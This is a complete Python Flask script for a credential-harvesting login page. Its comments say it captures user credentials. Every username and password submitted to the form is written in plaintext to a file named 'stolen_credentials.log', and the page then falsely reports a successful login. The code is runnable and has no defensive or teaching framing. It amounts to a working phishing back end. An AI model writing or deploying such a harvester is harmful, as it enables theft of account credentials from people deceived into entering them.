from flask import Flask, request, redirect, url_for, render_template_string
import logging

app = Flask(__name__)

# Set up logging to capture user credentials
logging.basicConfig(filename='stolen_credentials.log', level=logging.INFO, format='%(asctime)s - %(message)s')

login_form = '''
<!doctype html>
<title>Login</title>
<h1>Login</h1>
<form method=post action="/login">
  <label for="username">Username:</label>
  <input type="text" id="username" name="username">
  <br>
  <label for="password">Password:</label>
  <input type="password" id="password" name="password">
  <br>
  <input type="submit" value="Login">
</form>
'''

@app.route('/')
def index():
    return redirect(url_for('login'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form['username']
        password = request.form['password']
        # Record the user's account and password
        logging.info('Username: {}, Password: {}'.format(username, password))
        return 'Logged in as {}'.format(username)
    return render_template_string(login_form)

if __name__ == '__main__':
    app.run(port=5001)
